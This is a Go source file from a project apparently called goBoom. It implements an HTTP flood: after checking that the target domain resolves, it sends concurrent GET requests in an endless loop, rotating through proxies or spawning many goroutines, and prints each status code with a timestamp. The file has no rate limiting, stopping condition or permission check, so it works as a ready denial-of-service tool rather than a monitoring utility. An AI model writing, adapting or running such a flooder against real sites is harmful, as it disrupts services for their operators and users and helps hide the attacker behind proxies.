package engines

import (
	"fmt"
	"goBoom/lib"
	"net"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"
)

func HandlerProxy(domain, proxy string) string {
	//just connect to the website and check the status code
	//use proxy to connect
	//format of proxy is ip:port
	//format of domain is domain.com
	mutex := &sync.Mutex{}
	mutex.Lock()
	proxyUrl, err := url.Parse("http://" + proxy)
	mutex.Unlock()
	if err != nil {
		return "error"
	}
	//create a new http client
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyUrl),
		}}
	//set http client like a mozilla browser
	//client timeout after 1 second
	client.Timeout = time.Millisecond * 1000
	//connect to the website
	mutex.Lock()
	resp, err := client.Get("http://" + domain)
	mutex.Unlock()
	if err != nil {
		return "error"
	}
	defer resp.Body.Close()
	//if resp is 503 too many connection
	// make [][]string statusCodeToEscape
	if lib.StringInSlice(resp.Status, lib.StatusCodeToEscape) {
		return "error"
	}
	if resp.StatusCode != 0 {
		//fmt.Println(resp.Status)
		return resp.Status
	} else {
		return "error"
	}
}

func handler(domain string) string {
	//just connect to the website and check the status code
	//format of domain is domain.com
	//create a new http client
	client := &http.Client{}
	//set http client like a mozilla browser
	client.Timeout = time.Millisecond * 100
	//connect to the website
	resp, err := client.Get(domain)
	if err != nil {
		return "error"
	}
	defer resp.Body.Close()
	//if resp is 503 too many connection
	// make [][]string statusCodeToEscape
	if lib.StringInSlice(resp.Status, lib.StatusCodeToEscape) {
		return "error"
	}
	if resp.StatusCode != 0 {
		//fmt.Println(resp.Status)
		return resp.Status
	} else {
		return "error"
	}
}

func check_host_up(url string) bool {
	//check if the host is up
	domain_split := strings.Split(url, "/")
	domain := domain_split[2]
	_, err := net.LookupHost(domain)
	if err != nil {
		return false
	}
	return true
}

func Get(url string, proxys []string, cpu int) string {
	if !check_host_up(url) {
		fmt.Println("The domain or ip is not up")
		os.Exit(1)
	}

	if len(proxys) > 0 {
		//start the threads
		//create a channel list of good proxy
		var wg sync.WaitGroup
		for {
			for _, proxy := range proxys {
				wg.Add(1)
				go func(proxy string) {
					status := HandlerProxy(url, proxy)
					fmt.Println(status + " : " + proxy + "	time :	" + time.Now().Format("15:04:05.000"))
					wg.Done()
				}(proxy)
			}
			wg.Wait()
		}

	}

	if len(proxys) == 0 {
		runtime.GOMAXPROCS(runtime.NumCPU())
		for {
			var wg sync.WaitGroup
			for i := 0; i < cpu; i++ {
				wg.Add(1)
				go func() {
					//use func handler
					status := handler(url)
					fmt.Println(status, "time :", time.Now().Format("15:04:05.000"))
					wg.Done()
				}()
			}
			wg.Wait()
			fmt.Println("All threads are dead, restarting")
		}
	}
	return "Finished"
}
